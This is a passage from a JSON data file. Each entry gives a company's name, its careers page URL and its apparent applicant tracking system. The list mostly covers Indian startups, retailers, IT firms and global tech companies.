"https://pharmeasy.in/careers", "t": "Lever" }, { "n": "Netmeds", "u": "https://www.netmeds.com/careers", "t": "Lever" }, { "n": "HealthKart", "u": "https://www.healthkart.com/careers", "t": "Lever" }, { "n": "Pepperfry", "u": "https://www.pepperfry.com/careers.html", "t": "Lever" }, { "n": "Urban Ladder", "u": "https://www.urbanladder.com/careers", "t": "Lever" }, { "n": "Livspace", "u": "https://www.livspace.com/in/careers", "t": "Lever" }, { "n": "Homelane", "u": "https://www.homelane.com/careers", "t": "Lever" }, { "n": "Purplle", "u": "https://www.purplle.com/careers", "t": "Lever" }, { "n": "Sugar Cosmetics", "u": "https://in.sugarcosmetics.com/pages/careers", "t": "Lever" }, { "n": "Mamaearth", "u": "https://mamaearth.in/careers", "t": "Lever" }, { "n": "boAt", "u": "https://www.boat-lifestyle.com/pages/careers", "t": "Lever" }, { "n": "Noise", "u": "https://www.gonoise.com/pages/careers", "t": "Lever" }, { "n": "Fire-Boltt", "u": "https://www.fireboltt.com/careers", "t": "Lever" }, { "n": "WOW Skin Science", "u": "https://www.buywow.in/careers", "t": "Lever" }, { "n": "mCaffeine", "u": "https://www.mcaffeine.com/careers", "t": "Lever" }, { "n": "Plum Goodness", "u": "https://plumgoodness.com/careers", "t": "Lever" }, { "n": "Beardo", "u": "https://beardo.in/careers", "t": "Lever" }, { "n": "The Man Company", "u": "https://www.themancompany.com/careers", "t": "Lever" }, { "n": "Bombay Shaving Company", "u": "https://bombayshavingcompany.com/careers", "t": "Lever" }, { "n": "Licious", "u": "https://www.licious.in/careers", "t": "Lever" }, { "n": "FreshToHome", "u": "https://www.freshtohome.com/careers", "t": "Lever" }, { "n": "Country Delight", "u": "https://www.countrydelight.in/careers", "t": "Lever" }, { "n": "Milkbasket", "u": "https://www.milkbasket.com/careers", "t": "Lever" }, { "n": "Supr Daily", "u": "https://suprdaily.com/careers", "t": "Lever" }, { "n": "BB Daily", "u": "https://www.bbdaily.com/careers", "t": "Lever" }, { "n": "DailyNinja", "u": "https://www.dailyninja.in/careers", "t": "Lever" }, { "n": "JioMart", "u": "https://www.jiomart.com/careers", "t": "Custom" }, { "n": "Reliance Digital", "u": "https://www.reliancedigital.in/careers", "t": "Custom" }, { "n": "Croma", "u": "https://www.croma.com/careers", "t": "Custom" }, { "n": "Tata Cliq", "u": "https://www.tatacliq.com/careers", "t": "Custom" }, { "n": "Shoppers Stop", "u": "https://www.shoppersstop.com/careers", "t": "Custom" }, { "n": "Lifestyle", "u": "https://www.lifestylestores.com/careers", "t": "Custom" }, { "n": "Max Fashion", "u": "https://www.maxfashion.in/careers", "t": "Custom" }, { "n": "FabIndia", "u": "https://www.fabindia.com/careers", "t": "Custom" }, { "n": "Westside", "u": "https://www.westside.com/careers", "t": "Custom" }, { "n": "Bewakoof", "u": "https://www.bewakoof.com/careers", "t": "Lever" }, { "n": "The Souled Store", "u": "https://www.thesouledstore.com/careers", "t": "Lever" }, { "n": "Snitch", "u": "https://www.snitch.co.in/careers", "t": "Lever" }, { "n": "Urbanic", "u": "https://www.urbanic.com/careers", "t": "Lever" }, { "n": "HRX", "u": "https://www.hrxbrand.com/careers", "t": "Lever" }, { "n": "Rare Rabbit", "u": "https://www.rfrb.co/careers", "t": "Custom" }, { "n": "Jack & Jones", "u": "https://www.jackjones.in/careers", "t": "Custom" }, { "n": "Wrogn", "u": "https://wrogn.com/careers", "t": "Custom" }, { "n": "Campus", "u": "https://campusshoes.com/careers", "t": "Custom" }, { "n": "Sparx", "u": "https://www.sparxshoes.in/careers", "t": "Custom" }, { "n": "Bata", "u": "https://www.bata.in/careers", "t": "Custom" }, { "n": "Metro Shoes", "u": "https://www.metroshoes.net/careers", "t": "Custom" }, { "n": "Woodland", "u": "https://www.woodlandworldwide.com/careers", "t": "Custom" }, { "n": "Decathlon", "u": "https://www.decathlon.in/careers", "t": "Custom" }, { "n": "Skechers", "u": "https://www.skechers.in/careers", "t": "Custom" }, { "n": "Puma", "u": "https://in.puma.com/in/en/careers", "t": "Custom" }, { "n": "Adidas", "u": "https://www.adidas.co.in/careers", "t": "Custom" }, { "n": "Nike", "u": "https://www.nike.com/in/careers", "t": "Custom" }, { "n": "Reebok", "u": "https://www.reebok.in/careers", "t": "Custom" }, { "n": "ASICS", "u": "https://www.asics.com/in/en-in/careers", "t": "Custom" }, { "n": "Crocs", "u": "https://www.crocs.in/careers", "t": "Custom" }, { "n": "Rebel Foods", "u": "https://www.rebelfoods.com/careers", "t": "Lever" }, { "n": "Box8", "u": "https://www.box8.in/careers", "t": "Lever" }, { "n": "Faasos", "u": "https://www.faasos.com/careers", "t": "Lever" }, { "n": "EatFit", "u": "https://www.eatfit.in/careers", "t": "Lever" }, { "n": "FreshMenu", "u": "https://www.freshmenu.com/careers", "t": "Lever" }, { "n": "Chaayos", "u": "https://www.chaayos.com/careers", "t": "Lever" }, { "n": "Third Wave Coffee", "u": "https://thirdwavecoffee.in/careers", "t": "Lever" }, { "n": "Blue Tokai", "u": "https://bluetokaicoffee.com/careers", "t": "Lever" }, { "n": "Sleepy Owl", "u": "https://sleepyowl.co/careers", "t": "Lever" }, { "n": "Rage Coffee", "u": "https://ragecoffee.com/careers", "t": "Lever" }, { "n": "True Elements", "u": "https://www.trueelements.com/careers", "t": "Lever" }, { "n": "Epigamia", "u": "https://www.epigamia.com/careers", "t": "Lever" }, { "n": "Paperboat", "u": "https://paperboatdrinks.com/careers", "t": "Lever" }, { "n": "Raw Pressery", "u": "https://www.rawpressery.com/careers", "t": "Lever" }, { "n": "Lahori", "u": "https://lahori.in/careers", "t": "Lever" }, { "n": "Bira 91", "u": "https://www.bira91.com/careers", "t": "Lever" }, { "n": "Simplilearn", "u": "https://www.simplilearn.com/careers", "t": "Lever" }, { "n": "Scaler", "u": "https://www.scaler.com/careers", "t": "Lever" }, { "n": "Masai School", "u": "https://www.masaischool.com/careers", "t": "Lever" }, { "n": "Newton School", "u": "https://www.newtonschool.co/careers", "t": "Lever" }, { "n": "Coding Ninjas", "u": "https://www.codingninjas.com/careers", "t": "Lever" }, { "n": "PrepBytes", "u": "https://www.prepbytes.com/careers", "t": "Lever" }, { "n": "AlmaBetter", "u": "https://www.almabetter.com/careers", "t": "Lever" }, { "n": "Coding Blocks", "u": "https://codingblocks.com/careers", "t": "Lever" }, { "n": "Pepcoding", "u": "https://www.pepcoding.com/careers", "t": "Lever" }, { "n": "InterviewBit", "u": "https://www.interviewbit.com/careers", "t": "Lever" }, { "n": "GeeksforGeeks", "u": "https://www.geeksforgeeks.org/careers/", "t": "Custom" }, { "n": "HackerRank", "u": "https://www.hackerrank.com/careers", "t": "Greenhouse" }, { "n": "HackerEarth", "u": "https://www.hackerearth.com/careers/", "t": "Lever" }, { "n": "Toppr", "u": "https://www.toppr.com/careers", "t": "Lever" }, { "n": "Doubtnut", "u": "https://www.doubtnut.com/careers", "t": "Lever" }, { "n": "Testbook", "u": "https://testbook.com/careers", "t": "Lever" }, { "n": "Gradeup", "u": "https://gradeup.co/careers", "t": "Lever" }, { "n": "Embibe", "u": "https://www.embibe.com/careers", "t": "Lever" }, { "n": "Extramarks", "u": "https://www.extramarks.com/careers", "t": "Custom" }, { "n": "Meritnation", "u": "https://www.meritnation.com/careers", "t": "Custom" }, { "n": "Cuemath", "u": "https://www.cuemath.com/careers", "t": "Lever" }, { "n": "WhiteHat Jr", "u": "https://www.whitehatjr.com/careers", "t": "Custom" }, { "n": "Camp K12", "u": "https://campk12.com/careers", "t": "Lever" }, { "n": "Codingal", "u": "https://www.codingal.com/careers", "t": "Lever" }, { "n": "Tinkerly", "u": "https://www.tinkerly.in/careers", "t": "Lever" }, { "n": "STEMpedia", "u": "https://www.stempedia.com/careers", "t": "Lever" }, { "n": "SP Robotics", "u": "https://www.sproboticworks.com/careers", "t": "Custom" }, { "n": "Lead School", "u": "https://leadschool.in/careers", "t": "Lever" }, { "n": "Teachmint", "u": "https://www.teachmint.com/careers", "t": "Lever" }, { "n": "Classplus", "u": "https://classplusapp.com/careers", "t": "Lever" }, { "n": "Winuall", "u": "https://www.winuall.com/careers", "t": "Lever" }, { "n": "Adda247", "u": "https://www.adda247.com/careers", "t": "Lever" }, { "n": "Oliveboard", "u": "https://www.oliveboard.in/careers", "t": "Lever" }, { "n": "iQuanta", "u": "https://www.iquanta.in/careers", "t": "Custom" }, { "n": "Career360", "u": "https://www.careers360.com/careers", "t": "Custom" }, { "n": "Shiksha", "u": "https://www.shiksha.com/careers", "t": "Custom" }, { "n": "CollegeDunia", "u": "https://collegedunia.com/careers", "t": "Lever" }, { "n": "Collegedekho", "u": "https://www.collegedekho.com/careers", "t": "Lever" }, { "n": "Practo", "u": "https://www.practo.com/careers", "t": "Lever" }, { "n": "Portea Medical", "u": "https://www.portea.com/careers/", "t": "Lever" }, { "n": "DocsApp", "u": "https://www.docsapp.in/careers", "t": "Lever" }, { "n": "MFine", "u": "https://www.mfine.co/careers", "t": "Lever" }, { "n": "Pristyn Care", "u": "https://www.pristyncare.com/careers/", "t": "Lever" }, { "n": "Meddo Health", "u": "https://www.meddo.in/careers", "t": "Lever" }, { "n": "HealthifyMe", "u": "https://www.healthifyme.com/careers/", "t": "Lever" }, { "n": "GOQii", "u": "https://goqii.com/in-en/careers", "t": "Lever" }, { "n": "Ultrahuman", "u": "https://www.ultrahuman.com/careers", "t": "Lever" }, { "n": "Dozee", "u": "https://www.dozee.io/careers", "t": "Lever" }, { "n": "SigTuple", "u": "https://sigtuple.com/careers/", "t": "Lever" }, { "n": "Niramai", "u": "https://www.niramai.com/careers", "t": "Lever" }, { "n": "Qure.ai", "u": "https://qure.ai/careers/", "t": "Lever" }, { "n": "Tricog", "u": "https://www.tricog.com/careers", "t": "Lever" }, { "n": "BeatO", "u": "https://www.beatoapp.com/careers", "t": "Lever" }, { "n": "Phable Care", "u": "https://phablecare.com/careers", "t": "Lever" }, { "n": "Apollo 247", "u": "https://www.apollo247.com/careers", "t": "Custom" }, { "n": "Truemeds", "u": "https://www.truemeds.in/careers", "t": "Lever" }, { "n": "Generico", "u": "https://www.generico.in/careers", "t": "Lever" }, { "n": "SastaSundar", "u": "https://www.sastasundar.com/careers", "t": "Lever" }, { "n": "Naukri", "u": "https://www.naukri.com/careers", "t": "Custom" }, { "n": "Indeed India", "u": "https://www.indeed.com/cmp/Indeed/jobs", "t": "Custom" }, { "n": "Monster India", "u": "https://www.monsterindia.com/careers", "t": "Custom" }, { "n": "Shine.com", "u": "https://www.shine.com/careers", "t": "Custom" }, { "n": "TimesJobs", "u": "https://www.timesjobs.com/careers", "t": "Custom" }, { "n": "Freshersworld", "u": "https://www.freshersworld.com/careers", "t": "Custom" }, { "n": "Hirist", "u": "https://www.hirist.com/careers", "t": "Custom" }, { "n": "Instahyre", "u": "https://www.instahyre.com/careers", "t": "Lever" }, { "n": "CutShort", "u": "https://cutshort.io/careers", "t": "Lever" }, { "n": "AngelList India", "u": "https://angel.co/careers", "t": "Greenhouse" }, { "n": "Turing", "u": "https://www.turing.com/careers", "t": "Lever" }, { "n": "Toptal", "u": "https://www.toptal.com/careers", "t": "Custom" }, { "n": "Talent500", "u": "https://talent500.co/careers", "t": "Lever" }, { "n": "Belong", "u": "https://belong.co/careers", "t": "Lever" }, { "n": "Skillenza", "u": "https://skillenza.com/careers", "t": "Lever" }, { "n": "Darwinbox", "u": "https://darwinbox.com/careers", "t": "Lever" }, { "n": "Keka", "u": "https://www.keka.com/careers", "t": "Lever" }, { "n": "GreytHR", "u": "https://www.greythr.com/careers", "t": "Custom" }, { "n": "Zoho People", "u": "https://www.zoho.com/people/careers.html", "t": "Custom" }, { "n": "SumHR", "u": "https://www.sumhr.com/careers", "t": "Lever" }, { "n": "Zimyo", "u": "https://www.zimyo.com/careers", "t": "Lever" }, { "n": "factoHR", "u": "https://factohr.com/careers", "t": "Custom" }, { "n": "HROne", "u": "https://hrone.cloud/careers", "t": "Lever" }, { "n": "PocketHRMS", "u": "https://www.pockethrms.com/careers", "t": "Lever" }, { "n": "Freshworks", "u": "https://www.freshworks.com/company/careers/", "t": "Greenhouse" }, { "n": "Zoho", "u": "https://www.zoho.com/careers.html", "t": "Custom" }, { "n": "Chargebee", "u": "https://www.chargebee.com/company/careers/", "t": "Greenhouse" }, { "n": "Postman", "u": "https://www.postman.com/company/careers/", "t": "Greenhouse" }, { "n": "BrowserStack", "u": "https://www.browserstack.com/careers", "t": "Greenhouse" }, { "n": "Druva", "u": "https://www.druva.com/careers/", "t": "Greenhouse" }, { "n": "Icertis", "u": "https://www.icertis.com/company/careers/", "t": "Greenhouse" }, { "n": "HighRadius", "u": "https://www.highradius.com/careers/", "t": "Greenhouse" }, { "n": "MindTickle", "u": "https://www.mindtickle.com/company/careers/", "t": "Greenhouse" }, { "n": "LeadSquared", "u": "https://www.leadsquared.com/careers/", "t": "Lever" }, { "n": "Whatfix", "u": "https://whatfix.com/careers/", "t": "Greenhouse" }, { "n": "CleverTap", "u": "https://clevertap.com/careers/", "t": "Greenhouse" }, { "n": "WebEngage", "u": "https://webengage.com/careers/", "t": "Lever" }, { "n": "MoEngage", "u": "https://www.moengage.com/careers/", "t": "Greenhouse" }, { "n": "Sprinklr", "u": "https://www.sprinklr.com/careers/", "t": "Greenhouse" }, { "n": "Yellow.ai", "u": "https://yellow.ai/careers/", "t": "Greenhouse" }, { "n": "Observe.AI", "u": "https://www.observe.ai/careers", "t": "Greenhouse" }, { "n": "Haptik", "u": "https://haptik.ai/careers/", "t": "Lever" }, { "n": "Verloop", "u": "https://verloop.io/careers", "t": "Lever" }, { "n": "Gupshup", "u": "https://www.gupshup.io/careers", "t": "Lever" }, { "n": "Exotel", "u": "https://exotel.com/careers", "t": "Lever" }, { "n": "Knowlarity", "u": "https://www.knowlarity.com/careers", "t": "Lever" }, { "n": "Ozonetel", "u": "https://ozonetel.com/careers", "t": "Lever" }, { "n": "MyOperator", "u": "https://myoperator.com/careers", "t": "Lever" }, { "n": "Kaleyra", "u": "https://www.kaleyra.com/careers", "t": "Lever" }, { "n": "MSG91", "u": "https://msg91.com/careers", "t": "Lever" }, { "n": "Netcore Cloud", "u": "https://netcorecloud.com/careers", "t": "Lever" }, { "n": "Capillary Technologies", "u": "https://www.capillarytech.com/careers", "t": "Lever" }, { "n": "Manthan", "u": "https://manthan.com/careers/", "t": "Lever" }, { "n": "Salesken", "u": "https://www.salesken.ai/careers", "t": "Lever" }, { "n": "Vymo", "u": "https://www.getvymo.com/careers", "t": "Lever" }, { "n": "Leena AI", "u": "https://leena.ai/careers", "t": "Lever" }, { "n": "Hiver", "u": "https://hiverhq.com/careers", "t": "Lever" }, { "n": "Helpshift", "u": "https://www.helpshift.com/careers", "t": "Lever" }, { "n": "Kommunicate", "u": "https://www.kommunicate.io/careers", "t": "Lever" }, { "n": "Kapture CRM", "u": "https://www.kapturecrm.com/careers", "t": "Lever" }, { "n": "Kylas", "u": "https://kylas.io/careers", "t": "Lever" }, { "n": "Pepper Content", "u": "https://www.peppercontent.io/careers", "t": "Lever" }, { "n": "Wingify", "u": "https://wingify.com/careers", "t": "Lever" }, { "n": "ContentStack", "u": "https://www.contentstack.com/careers", "t": "Greenhouse" }, { "n": "Vwo", "u": "https://vwo.com/careers", "t": "Lever" }, { "n": "Hotjar", "u": "https://www.hotjar.com/careers", "t": "Greenhouse" }, { "n": "Mixpanel", "u": "https://mixpanel.com/careers", "t": "Greenhouse" }, { "n": "Amplitude", "u": "https://amplitude.com/careers", "t": "Greenhouse" }, { "n": "Heap", "u": "https://heap.io/careers", "t": "Greenhouse" }, { "n": "Pendo", "u": "https://www.pendo.io/careers", "t": "Greenhouse" }, { "n": "Appsflyer", "u": "https://www.appsflyer.com/careers", "t": "Greenhouse" }, { "n": "Branch", "u": "https://branch.io/careers", "t": "Greenhouse" }, { "n": "Adjust", "u": "https://www.adjust.com/careers", "t": "Greenhouse" }, { "n": "Singular", "u": "https://www.singular.net/careers", "t": "Greenhouse" }, { "n": "Segment", "u": "https://segment.com/jobs/", "t": "Greenhouse" }, { "n": "mParticle", "u": "https://www.mparticle.com/careers", "t": "Greenhouse" }, { "n": "RudderStack", "u": "https://www.rudderstack.com/careers", "t": "Greenhouse" }, { "n": "Airbyte", "u": "https://airbyte.com/careers", "t": "Greenhouse" }, { "n": "Fivetran", "u": "https://www.fivetran.com/careers", "t": "Greenhouse" }, { "n": "dbt Labs", "u": "https://www.getdbt.com/careers", "t": "Greenhouse" }, { "n": "Monte Carlo", "u": "https://www.montecarlodata.com/careers", "t": "Greenhouse" }, { "n": "Atlan", "u": "https://atlan.com/careers", "t": "Lever" }, { "n": "Alation", "u": "https://www.alation.com/careers", "t": "Greenhouse" }, { "n": "Collibra", "u": "https://www.collibra.com/careers", "t": "Greenhouse" }, { "n": "Informatica", "u": "https://careers.informatica.com/", "t": "Workday" }, { "n": "Talend", "u": "https://www.talend.com/careers", "t": "Greenhouse" }, { "n": "Alteryx", "u": "https://www.alteryx.com/careers", "t": "Workday" }, { "n": "Dataiku", "u": "https://www.dataiku.com/careers", "t": "Greenhouse" }, { "n": "Domino Data Lab", "u": "https://www.dominodatalab.com/careers", "t": "Greenhouse" }, { "n": "Weights & Biases", "u": "https://wandb.ai/careers", "t": "Greenhouse" }, { "n": "Neptune.ai", "u": "https://neptune.ai/careers", "t": "Greenhouse" }, { "n": "Comet ML", "u": "https://www.comet.com/careers", "t": "Greenhouse" }, { "n": "Fractal Analytics", "u": "https://fractal.ai/careers/", "t": "Lever" }, { "n": "Mu Sigma", "u": "https://www.mu-sigma.com/careers", "t": "Custom" }, { "n": "Tiger Analytics", "u": "https://www.tigeranalytics.com/careers/", "t": "Lever" }, { "n": "Sigmoid", "u": "https://www.sigmoid.com/careers/", "t": "Lever" }, { "n": "LatentView Analytics", "u": "https://www.latentview.com/careers/", "t": "Lever" }, { "n": "TheMathCompany", "u": "https://themathcompany.com/careers/", "t": "Lever" }, { "n": "Course5i", "u": "https://www.course5i.com/careers/", "t": "Lever" }, { "n": "Crayon Data", "u": "https://crayondata.com/careers/", "t": "Lever" }, { "n": "Mad Street Den", "u": "https://www.madstreetden.com/careers/", "t": "Lever" }, { "n": "Niki.ai", "u": "https://niki.ai/careers", "t": "Lever" }, { "n": "Vernacular.ai", "u": "https://vernacular.ai/careers", "t": "Lever" }, { "n": "Skit.ai", "u": "https://skit.ai/careers", "t": "Lever" }, { "n": "Uniphore", "u": "https://www.uniphore.com/careers", "t": "Lever" }, { "n": "Gnani.ai", "u": "https://gnani.ai/careers", "t": "Lever" }, { "n": "Staqu", "u": "https://www.staqu.com/careers", "t": "Lever" }, { "n": "Uncanny Vision", "u": "https://www.uncannyvision.com/careers", "t": "Lever" }, { "n": "Parallel Dots", "u": "https://paralleldots.com/careers", "t": "Lever" }, { "n": "Active.ai", "u": "https://active.ai/careers", "t": "Lever" }, { "n": "Arya.ai", "u": "https://arya.ai/careers", "t": "Lever" }, { "n": "Fluid AI", "u": "https://fluid.ai/careers", "t": "Lever" }, { "n": "Artivatic.ai", "u": "https://www.artivatic.ai/careers", "t": "Lever" }, { "n": "Cropin", "u": "https://www.cropin.com/careers", "t": "Lever" }, { "n": "AgNext", "u": "https://www.agnext.in/careers", "t": "Lever" }, { "n": "Intello Labs", "u": "https://www.intello.ag/careers", "t": "Lever" }, { "n": "Fasal", "u": "https://fasal.co/careers", "t": "Lever" }, { "n": "DeHaat", "u": "https://www.dehaat.com/careers", "t": "Lever" }, { "n": "Ninjacart", "u": "https://www.ninjacart.in/careers", "t": "Lever" }, { "n": "WayCool", "u": "https://waycool.in/careers", "t": "Lever" }, { "n": "Udaan", "u": "https://www.udaan.com/careers", "t": "Lever" }, { "n": "Jumbotail", "u": "https://www.jumbotail.com/careers", "t": "Lever" }, { "n": "ShopKirana", "u": "https://www.shopkirana.com/careers", "t": "Lever" }, { "n": "ElasticRun", "u": "https://www.elastic.run/careers", "t": "Lever" }, { "n": "Shadowfax", "u": "https://www.shadowfax.in/careers", "t": "Lever" }, { "n": "Delhivery", "u": "https://www.delhivery.com/careers", "t": "Lever" }, { "n": "Ecom Express", "u": "https://www.ecomexpress.in/careers", "t": "Custom" }, { "n": "XpressBees", "u": "https://www.xpressbees.com/careers", "t": "Lever" }, { "n": "BlueDart", "u": "https://www.bluedart.com/careers", "t": "Custom" }, { "n": "DTDC", "u": "https://www.dtdc.in/careers", "t": "Custom" }, { "n": "Gati", "u": "https://www.gati.com/careers", "t": "Custom" }, { "n": "Rivigo", "u": "https://www.rivigo.com/careers", "t": "Lever" }, { "n": "BlackBuck", "u": "https://www.blackbuck.com/careers", "t": "Lever" }, { "n": "Locus.sh", "u": "https://locus.sh/careers", "t": "Lever" }, { "n": "FarEye", "u": "https://fareye.com/careers", "t": "Lever" }, { "n": "Pickrr", "u": "https://www.pickrr.com/careers", "t": "Lever" }, { "n": "Shiprocket", "u": "https://www.shiprocket.in/careers", "t": "Lever" }, { "n": "Clickpost", "u": "https://www.clickpost.ai/careers", "t": "Lever" }, { "n": "Infosys", "u": "https://www.infosys.com/careers/", "t": "Custom" }, { "n": "TCS", "u": "https://www.tcs.com/careers", "t": "Custom" }, { "n": "Wipro", "u": "https://careers.wipro.com/", "t": "Custom" }, { "n": "HCL", "u": "https://www.hcltech.com/careers", "t": "Custom" }, { "n": "Tech Mahindra", "u": "https://careers.techmahindra.com/", "t": "Custom" }, { "n": "Cognizant", "u": "https://careers.cognizant.com/global-en/jobs/", "t": "Workday" }, { "n": "Accenture", "u": "https://www.accenture.com/in-en/careers", "t": "Custom" }, { "n": "Capgemini", "u": "https://www.capgemini.com/in-en/careers/", "t": "Custom" }, { "n": "LTIMindtree", "u": "https://www.ltimindtree.com/careers/", "t": "Custom" }, { "n": "Persistent Systems", "u": "https://www.persistent.com/careers/", "t": "Custom" }, { "n": "Mphasis", "u": "https://www.mphasis.com/careers.html", "t": "Custom" }, { "n": "Coforge", "u": "https://www.coforge.com/careers", "t": "Custom" }, { "n": "Birlasoft", "u": "https://www.birlasoft.com/careers", "t": "Custom" }, { "n": "Hexaware", "u": "https://hexaware.com/careers/", "t": "Custom" }, { "n": "Zensar", "u": "https://www.zensar.com/careers", "t": "Custom" }, { "n": "Cyient", "u": "https://www.cyient.com/careers", "t": "Custom" }, { "n": "LTTS", "u": "https://www.ltts.com/careers", "t": "Custom" }, { "n": "Happiest Minds", "u": "https://www.happiestminds.com/careers/", "t": "Custom" }, { "n": "Sonata Software", "u": "https://www.sonata-software.com/careers", "t": "Custom" }, { "n": "Mindtree", "u": "https://www.mindtree.com/careers", "t": "Custom" }, { "n": "NIIT Technologies", "u": "https://www.niit-tech.com/careers", "t": "Custom" }, { "n": "Mastech Digital", "u": "https://www.mastechdigital.com/careers", "t": "Custom" }, { "n": "Sasken", "u": "https://www.sasken.com/careers", "t": "Custom" }, { "n": "KPIT Technologies", "u": "https://www.kpit.com/careers/", "t": "Custom" }, { "n": "Tata Elxsi", "u": "https://www.tataelxsi.com/careers", "t": "Custom" }, { "n": "Ness Digital", "u": "https://www.ness.com/careers", "t": "Custom" }, { "n": "GlobalLogic", "u": "https://www.globallogic.com/careers/", "t": "Custom" }, { "n": "Nagarro", "u": "https://www.nagarro.com/careers", "t": "Custom" }, { "n": "Thoughtworks", "u": "https://www.thoughtworks.com/careers", "t": "Greenhouse" }, { "n": "Publicis Sapient", "u": "https://www.publicissapient.com/careers", "t": "Custom" }, { "n": "Valtech", "u": "https://www.valtech.com/careers/", "t": "Custom" }, { "n": "EPAM", "u": "https://www.epam.com/careers", "t": "Greenhouse" }, { "n": "Grid Dynamics", "u": "https://www.griddynamics.com/careers", "t": "Greenhouse" }, { "n": "Genpact", "u": "https://www.genpact.com/careers", "t": "Custom" }, { "n": "EXL", "u": "https://www.exlservice.com/careers", "t": "Custom" }, { "n": "Sutherland", "u": "https://www.sutherlandglobal.com/careers", "t": "Custom" }, { "n": "WNS", "u": "https://www.wns.com/careers", "t": "Custom" }, { "n": "Concentrix", "u": "https://www.concentrix.com/careers/", "t": "Custom" }, { "n": "Teleperformance", "u": "https://www.teleperformance.com/careers", "t": "Custom" }, { "n": "Firstsource", "u": "https://www.firstsource.com/careers", "t": "Custom" }, { "n": "CSS Corp", "u": "https://www.csscorp.com/careers", "t": "Custom" }, { "n": "IBM", "u": "https://www.ibm.com/employment/in-en/", "t": "Workday" }, { "n": "Oracle", "u": "https://www.oracle.com/in/corporate/careers/", "t": "Custom" }, { "n": "SAP Labs", "u": "https://jobs.sap.com/search/?q=&locationsearch=india", "t": "SuccessFactors" }, { "n": "Salesforce", "u": "https://www.salesforce.com/in/company/careers/", "t": "Greenhouse" }, { "n": "Adobe", "u": "https://careers.adobe.com/", "t": "Workday" }, { "n": "Atlassian", "u": "https://www.atlassian.com/company/careers", "t": "Greenhouse" }, { "n": "Cisco", "u": "https://jobs.cisco.com/", "t": "Workday" }, { "n": "VMware", "u": "https://careers.vmware.com", "t": "Workday" }, { "n": "Dell", "u": "https://jobs.dell.com/india", "t": "Workday" }, { "n": "HP", "u": "https://jobs.hp.com/", "t": "Workday" }, { "n": "Intel", "u": "https://jobs.intel.com/", "t": "Workday" }, { "n": "Qualcomm", "u": "https://careers.qualcomm.com/", "t": "Workday" }, { "n": "NVIDIA", "u": "https://nvidia.wd5.myworkdayjobs.com/NVIDIAExternalCareerSite", "t": "Workday" }, { "n": "AMD", "u": "https://careers.amd.com/", "t": "Workday" }, { "n": "Samsung", "u": "https://www.samsung.com/in/aboutsamsung/careers/", "t": "Custom" }, { "n": "Sony", "u": "https://www.sony.co.in/careers", "t": "Custom" }, { "n": "LG", "u": "https://www.lg.com/in/support/careers", "t": "Custom" }, { "n": "Panasonic", "u": "https://www.panasonic.com/in/corporate/careers.html", "t": "Custom" }, { "n": "Philips", "u": "https://www.careers.philips.com/", "t": "Workday" }, { "n": "Siemens", "u": "https://jobs.siemens.com/", "t": "Workday" }, { "n": "Bosch", "u": "https://www.bosch.in/careers/", "t": "Custom" }, { "n": "Honeywell", "u": "https://careers.honeywell.com/", "t": "Workday" }, { "n": "GE", "u": "https://jobs.gecareers.com/", "t": "Workday" }, { "n": "Schneider Electric", "u": "https://www.se.com/in/en/about-us/careers/", "t": "Workday" }, { "n": "ABB", "u": "https://new.abb.com/careers", "t": "Workday" }, { "n": "Emerson", "u": "https://www.emerson.com/en-in/careers", "t": "Workday" }, { "n": "Rockwell", "u": "https://www.rockwellautomation.com/careers", "t": "Workday" }, { "n": "Texas Instruments", "u": "https://careers.ti.com/", "t": "Workday" }, { "n": "NXP", "u": "https://www.nxp.com/company/about-nxp/careers", "t": "Workday" }, { "n": "Infineon", "u": "https://www.infineon.com/careers", "t": "Workday" }, { "n": "STMicroelectronics", "u": "https://www.st.com/content/st_com/en/about/careers.html", "t": "Workday" }, { "n": "Micron", "u": "https://micron.wd1.myworkdayjobs.com/External", "t": "Workday" }, { "n": "Western Digital", "u": "https://jobs.westerndigital.com/", "t": "Workday" }, { "n": "Seagate", "u": "https://www.seagate.com/in/en/jobs/", "t": "Workday" }, { "n": "NetApp", "u": "https://www.netapp.com/company/careers/", "t": "Workday" }, { "n": "Pure Storage", "u": "https://www.purestorage.com/company/careers.html", "t": "Greenhouse" }, { "n": "Nutanix", "u": "https://www.nutanix.com/careers", "t": "Greenhouse" }, { "n": "Games24x7", "u": "https://www.games24x7.com/careers/", "t": "Lever" }, { "n": "Mobile Premier League", "u": "https://www.mpl.live/careers", "t": "Lever" }, { "n": "Nazara Technologies", "u": "https://www.nazara.com/careers/", "t": "Lever" }, { "n": "JetSynthesys", "u": "https://www.jetsynthesys.com/careers/", "t": "Lever" }, { "n": "Gameskraft", "u": "https://gameskraft.com/careers/", "t": "Lever" }, { "n": "Loco", "u": "https://loco.gg/careers", "t": "Lever" }, { "n": "Rooter", "u": "https://rooter.gg/careers", "t": "Lever" }, { "n": "Paytm First Games", "u": "https://firstgames.in/careers", "t": "Lever" }, { "n": "Junglee Games", "u": "https://www.jungleegames.com/careers", "t": "Lever" }, { "n": "Adda52", "u": "https://www.adda52.com/careers", "t": "Custom" }, { "n": "Rummy Circle", "u": "https://www.rummycircle.com/careers", "t": "Custom" }, { "n": "PokerBaazi", "u": "https://www.pokerbaazi.com/careers", "t": "Custom" }, { "n": "A23", "u": "https://www.a23.com/careers", "t": "Custom" }, { "n": "Zupee", "u": "https://www.zupee.com/careers", "t": "Lever" }, { "n": "WinZO", "u": "https://www.winzogames.com/careers", "t": "Lever" }, { "n": "Pocket52", "u": "https://pocket52.com/careers", "t": "Lever" }, { "n": "GetMega", "u": "https://www.getmega.com/careers", "t": "Lever" }, { "n": "Rush", "u": "https://www.getrushapp.com/careers", "t": "Lever" }, { "n": "Rario", "u": "https://rario.com/careers", "t": "Lever" }, { "n": "FanCode", "u": "https://fancode.com/careers", "t": "Lever" }, { "n": "Times Internet", "u": "https://timesinternet.in/careers/", "t": "Custom" }, { "n": "Zee5", "u": "https://www.zee5.com/careers", "t": "Custom" }, { "n": "Sony LIV", "u": "https://www.sonyliv.com/careers", "t": "Custom" }, { "n": "Viacom18", "u": "https://www.viacom18.com/careers", "t": "Custom" }, { "n": "Voot", "u": "https://www.voot.com/careers", "t": "Custom" }, { "n": "ALTBalaji", "u": "https://www.altbalaji.com/careers", "t": "Custom" }, { "n": "Eros Now", "u": "https://erosnow.com/careers", "t": "Custom" }, { "n": "MX Player", "u": "https://www.mxplayer.in/careers", "t": "Custom" }, { "n": "Pocket FM", "u": "https://pocketfm.com/careers", "t": "Lever" }, { "n": "Kuku FM", "u": "https://kukufm.com/careers", "t": "Lever" }, { "n": "Headfone", "u": "https://headfone.in/careers", "t": "Lever" }, { "n": "HDFC Bank", "u": "https://www.hdfcbank.com/personal/about-us/careers", "t": 